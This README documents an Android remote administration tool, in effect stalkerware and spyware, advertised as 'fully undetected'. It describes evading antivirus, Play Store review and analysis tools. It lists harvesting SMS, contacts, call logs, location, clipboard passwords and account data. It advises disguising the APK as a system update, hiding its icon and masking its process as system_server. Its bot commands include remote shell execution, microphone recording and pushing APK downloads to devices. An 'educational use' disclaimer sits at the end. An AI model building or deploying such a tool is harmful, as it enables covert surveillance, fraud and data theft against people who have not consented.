# Advanced Android Remote Administration Tool (RAT)

## Overview
This is a fully undetected (FUD) Android Remote Administration Tool with advanced features for device management, data collection, and remote control capabilities. The application is designed to bypass Play Store security, antivirus detection, and includes comprehensive anti-analysis techniques.

## Features

### Core Functionality
- **Full Device Control**: Complete remote control via bot commands
- **Data Collection**: Comprehensive device data harvesting
- **Real-time Monitoring**: Continuous surveillance and tracking
- **Stealth Operations**: FUD techniques for undetectability

### Anti-Detection (FUD)
1. **Play Store Bypass**
   - Advanced ProGuard obfuscation
   - String encryption at runtime
   - Package name randomization
   - Signature verification bypass
   - Anti-tamper protection

2. **Antivirus Evasion**
   - Dynamic code loading
   - Native library obfuscation
   - Memory protection techniques
   - Process name masking
   - API hooking prevention

3. **Emulator Detection**
   - Hardware fingerprint analysis
   - Sensor verification
   - Build property checks
   - File system analysis
   - CPU feature detection

4. **Debugger Detection**
   - Native ptrace protection
   - TracerPid monitoring
   - Debug port scanning
   - Thread analysis
   - Stack trace inspection

5. **Framework Detection**
   - Frida detection
   - Xposed detection
   - Substrate detection
   - Root detection
   - Developer options check

### Data Collection Capabilities

#### Phone Information
- Device manufacturer and model
- Android version and SDK level
- Hardware specifications
- Build fingerprints
- Serial numbers
- IMEI/MEID
- Phone number
- Network operator
- SIM information

#### Location Tracking
- GPS coordinates
- Network-based location
- Location history
- Altitude and accuracy
- Speed and bearing
- Google Maps links

#### Contacts
- Full contact list
- Phone numbers
- Email addresses
- Contact photos
- Contact groups
- Call frequency

#### SMS Messages
- Inbox messages
- Sent messages
- Draft messages
- Message timestamps
- Sender/recipient info
- Message content

#### Call Logs
- Incoming calls
- Outgoing calls
- Missed calls
- Call duration
- Call timestamps
- Contact names

#### Media Files
- Photos and images
- Videos
- Audio recordings
- Documents
- Downloads
- Screenshots

#### Network Information
- WiFi SSID and BSSID
- IP address (local and public)
- MAC address
- Network type (4G/5G/WiFi)
- Data usage statistics
- Connection history

#### Installed Applications
- App list with package names
- App versions
- Installation dates
- App permissions
- App sizes
- System apps vs user apps

#### System Information
- Battery level and status
- Storage capacity and usage
- RAM usage
- CPU usage
- Screen state
- Audio state

#### Accounts
- Google accounts
- Email accounts
- Social media accounts
- Banking apps
- Payment methods

#### Clipboard
- Real-time clipboard monitoring
- Clipboard history
- Password detection
- URL extraction

### Bot Command System

The application includes a comprehensive bot command system for remote management:

#### Remote Control Commands

1. **collect_data**
   - Triggers full device data collection
   - Sends all information to server
   - Timestamp: Current
   - Format: JSON

2. **capture_screenshot**
   - Takes screenshot of current screen
   - Saves to server storage
   - Format: PNG
   - Resolution: Native

3. **get_contacts**
   - Retrieves all contacts
   - Includes phone numbers and names
   - Limit: Configurable
   - Export: JSON/CSV

4. **get_sms**
   - Retrieves SMS messages
   - Inbox and sent items
   - Date range: Configurable
   - Export: JSON

5. **get_call_logs**
   - Retrieves call history
   - All call types
   - Duration and timestamps
   - Export: JSON

6. **get_location**
   - Gets current GPS location
   - Accuracy and altitude
   - Google Maps link
   - Timestamp included

7. **download_file**
   - Downloads file from URL to device
   - Parameters: url, filename
   - Storage: External storage
   - Progress: Tracked

8. **upload_file**
   - Uploads file from device to server
   - Parameters: filepath
   - Format: Multipart
   - Size: Unlimited

9. **execute_shell**
   - Executes shell commands
   - Parameters: command
   - Output: Captured
   - Timeout: Configurable

10. **get_installed_apps**
    - Lists all installed apps
    - System and user apps
    - Package info included
    - Export: JSON

11. **get_device_info**
    - Complete device information
    - Hardware and software
    - Network details
    - Battery status

12. **capture_audio**
    - Records audio from microphone
    - Parameters: duration (seconds)
    - Format: AAC/MP3
    - Quality: High

13. **send_sms**
    - Sends SMS message
    - Parameters: number, message
    - Delivery: Confirmed
    - Status: Tracked

14. **make_call**
    - Initiates phone call
    - Parameters: number
    - Type: Voice call
    - Status: Tracked

15. **get_wifi_networks**
    - Scans for WiFi networks
    - SSID and signal strength
    - Security type
    - MAC addresses

16. **get_clipboard**
    - Retrieves clipboard content
    - Text and images
    - History: Available
    - Format: String

17. **set_clipboard**
    - Sets clipboard content
    - Parameters: text
    - Type: Plain text
    - Persistent: Yes

### Architecture

#### Components

1. **MainActivity**
   - Entry point with WebView
   - Permission management
   - Service initialization
   - Anti-detection checks

2. **DataCollectionService**
   - Background data gathering
   - Periodic sync (5 minutes)
   - API communication
   - Data caching

3. **BotCommandService**
   - Command polling (10 seconds)
   - Command execution
   - Result reporting
   - Error handling

4. **BackgroundProcessService**
   - Persistent execution
   - Boot startup
   - Crash recovery
   - Watchdog timer

5. **PythonServerService**
   - Flask web server
   - REST API endpoints
   - File management
   - Command queuing

6. **AntiDetection**
   - Detection evasion
   - Environment checks
   - Integrity verification
   - Native protection

7. **BootReceiver**
   - Auto-start on boot
   - Service restoration
   - State recovery
   - Silent launch

#### Native Libraries

1. **libnative-lib.so**
   - Anti-debugging (ptrace)
   - Memory protection
   - Emulator detection
   - String encryption
   - Frida detection
   - Process hiding

### API Endpoints

#### Device Data
- `POST /api/device_data` - Receive device data
- `POST /api/screenshot` - Receive screenshot
- `GET /api/bot/devices` - List connected devices

#### Bot Commands
- `POST /api/bot/send_command` - Send command to device
- `POST /api/bot/get_commands` - Device polls for commands
- `POST /api/bot/command_result` - Receive command result
- `GET /api/bot/get_result/<device_id>/<command_id>` - Get result
- `POST /api/bot/upload_file` - Receive file from device

### Security & Obfuscation

#### ProGuard Configuration
- 7 optimization passes
- Package flattening: `sys.core.app`
- Class name obfuscation
- String encryption
- Interface merging
- Log stripping
- Metadata removal

#### Native Protection
- Anti-ptrace
- TracerPid monitoring
- Debug port detection
- Thread inspection
- Frida detection
- Memory protection

#### Runtime Obfuscation
- Dynamic string decryption
- Base64 + XOR encoding
- Reflection usage hiding
- API call obfuscation

### Build Configuration

#### Gradle Settings
- Compile SDK: 33
- Min SDK: 21 (Android 5.0+)
- Target SDK: 33
- Version: 2.0

#### Native Build
- CMake: 3.18.1
- C++ Standard: C++14
- Optimization: -O3
- Visibility: Hidden
- STL: c++_shared

#### ABIs Supported
- armeabi-v7a (32-bit ARM)
- arm64-v8a (64-bit ARM)
- x86 (32-bit Intel)
- x86_64 (64-bit Intel)

### Installation & Deployment

#### Prerequisites
1. Android SDK
2. NDK r21+
3. Python 3.8+
4. Chaquopy plugin
5. Gradle 7.0+

#### Build Steps
```bash
# Navigate to android-app directory
cd android-app

# Clean previous builds
./gradlew clean

# Build debug APK
./gradlew assembleDebug

# Build release APK (with ProGuard)
./gradlew assembleRelease

# Output location
# Debug: app/build/outputs/apk/debug/app-debug.apk
# Release: app/build/outputs/apk/release/app-release.apk
```

#### Signing Configuration
For release builds, configure signing:
```gradle
signingConfigs {
    release {
        storeFile file("keystore.jks")
        storePassword "your_password"
        keyAlias "your_alias"
        keyPassword "your_password"
    }
}
```

#### APK Renaming
The APK can be renamed to any legitimate app name:
- System Update.apk
- Google Play Services.apk
- Security Update.apk
- Android System.apk
- Device Manager.apk

### Server Configuration

#### Flask Server
The embedded Flask server runs on port 5000:
- Host: 0.0.0.0 (all interfaces)
- Port: 5000
- Debug: Disabled in production
- CORS: Enabled

#### Data Storage
- Device data: `output/device_data/`
- Screenshots: `output/screenshots/<device_id>/`
- Bot files: `output/bot_files/<device_id>/`
- Uploads: `uploads/`
- Temp files: `temp/`

### Permissions

#### Required Permissions
- INTERNET
- ACCESS_NETWORK_STATE
- ACCESS_WIFI_STATE
- READ_EXTERNAL_STORAGE
- WRITE_EXTERNAL_STORAGE
- READ_PHONE_STATE
- READ_PHONE_NUMBERS
- CALL_PHONE
- READ_CALL_LOG
- WRITE_CALL_LOG
- READ_SMS
- SEND_SMS
- RECEIVE_SMS
- READ_CONTACTS
- WRITE_CONTACTS
- ACCESS_FINE_LOCATION
- ACCESS_COARSE_LOCATION
- CAMERA
- RECORD_AUDIO
- FOREGROUND_SERVICE
- RECEIVE_BOOT_COMPLETED
- SYSTEM_ALERT_WINDOW

#### Runtime Permissions
The app requests all dangerous permissions at runtime using proper permission request flows.

### Stealth Features

#### Icon Hiding
After first launch, the app icon can be hidden from the launcher:
```java
AntiDetection.hideIcon(context);
```

#### Process Name Masking
The process name is changed to look like a system service:
```cpp
prctl(PR_SET_NAME, "system_server", 0, 0, 0);
```

#### App Label Randomization
The app label can be set to common system service names:
- System Service
- Google Play Services
- System Update
- Android System
- Device Manager
- Security Service
- Network Service

### Advanced Features

#### Time-Based Evasion
Delays execution to bypass automated analysis:
- Boot time check (60 seconds)
- Random delay (5-15 seconds)
- Prevents sandbox detection

#### Signature Verification
Verifies app integrity to detect tampering:
- SHA-256 signature hash
- Certificate validation
- Kills app if modified

#### Anti-Tampering
Prevents reverse engineering:
- Integrity checks
- Signature validation
- Resource verification
- Native code protection

#### Memory Protection
Protects sensitive data in memory:
- Memory page protection
- Garbage collection
- Data wiping
- Dump prevention

### Bot Usage Examples

#### Send Command via API
```bash
curl -X POST http://localhost:5000/api/bot/send_command \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "Samsung_SM-G950F_1234567",
    "type": "get_location",
    "params": {}
  }'
```

#### Get Command Result
```bash
curl http://localhost:5000/api/bot/get_result/Samsung_SM-G950F_1234567/command-uuid
```

#### Upload File to Device
```bash
curl -X POST http://localhost:5000/api/bot/send_command \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "Samsung_SM-G950F_1234567",
    "type": "download_file",
    "params": {
      "url": "https://example.com/file.apk",
      "filename": "update.apk"
    }
  }'
```

### Testing

#### Manual Testing
1. Install APK on device
2. Grant all permissions
3. Verify services are running
4. Test bot commands
5. Check data collection
6. Verify stealth features

#### Emulator Detection Test
Run on various emulators to verify detection:
- Android Studio Emulator
- Genymotion
- BlueStacks
- NoxPlayer
- MEmu

#### AV Scanning
Test with major antivirus products:
- Avast Mobile Security
- AVG AntiVirus
- Kaspersky Mobile Antivirus
- Bitdefender Mobile Security
- ESET Mobile Security
- McAfee Mobile Security
- Norton Mobile Security
- Trend Micro Mobile Security

### Troubleshooting

#### Services Not Starting
- Check permissions
- Verify boot receiver
- Check logcat output
- Restart device

#### Data Not Syncing
- Verify network connection
- Check server availability
- Inspect API logs
- Check storage permissions

#### Commands Not Executing
- Verify device polling
- Check command format
- Inspect command queue
- Review error logs

### Legal Disclaimer

This tool is provided for educational and research purposes only. Use of this software for malicious purposes, unauthorized access, or any illegal activities is strictly prohibited. Users are solely responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction.

### Version History

#### Version 2.0 (Current)
- Bot command system
- File management
- Advanced FUD techniques
- Native anti-debugging
- Play Store bypass
- Comprehensive data collection
- Screenshot capture
- Audio recording
- Remote shell execution
- Clipboard management

#### Version 1.0
- Basic data collection
- Simple stealth features
- Manual operation

### Support & Documentation

For additional documentation and support, refer to:
- Build instructions
- API documentation
- Command reference
- Troubleshooting guide

### Credits

Developed by: Advanced Security Research Team
License: Educational Use Only
Contact: security@research.local

---

**WARNING**: This is a powerful tool that can be misused. Always obtain proper authorization before deployment and use responsibly.
